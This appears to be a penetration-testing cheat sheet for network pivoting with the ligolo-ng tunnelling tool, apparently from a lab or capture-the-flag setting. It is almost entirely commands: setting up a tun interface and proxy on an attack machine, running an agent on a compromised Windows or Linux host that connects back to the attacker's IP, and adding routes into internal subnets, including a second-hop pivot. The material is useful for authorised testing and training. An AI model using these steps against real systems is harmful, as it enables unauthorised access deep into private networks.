
### Setup — Two Components

- **`proxy`** — runs on your attack machine
- **`agent`** — runs on the compromised host
### 1. Attack Machine (Proxy Setup)

**Create a tun interface:**

```ruby
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

**Start the proxy:**

```ruby
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```
### 2. Victim Machine (Agent)

**Upload and run the agent:**

For windows:

```ruby
.\agent.exe -connect 10.10.14.61:11601 -ignore-cert
```

For Linux:

```ruby
./agent -connect 10.10.14.212:11601 -ignore-cert
```


### Back on Proxy — Start Tunnel

```ruby
ligolo-ng » session
# select the session number

[Agent] » start
```

Add route to internal network:

```ruby
sudo ip route add 172.16.139.0/24 dev ligolo
```

for the second pivot : 

```
sudo ip tuntap add user $USER mode tun ligolo2
sudo ip link set ligolo2 up
```

```
.\agent.exe -connect 172.16.139.10:11601 -ignore-cert
```

```
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
```

```
start --tun ligolo2   
```

```
sudo ip route add 172.16.210.0/24 dev ligolo2
```

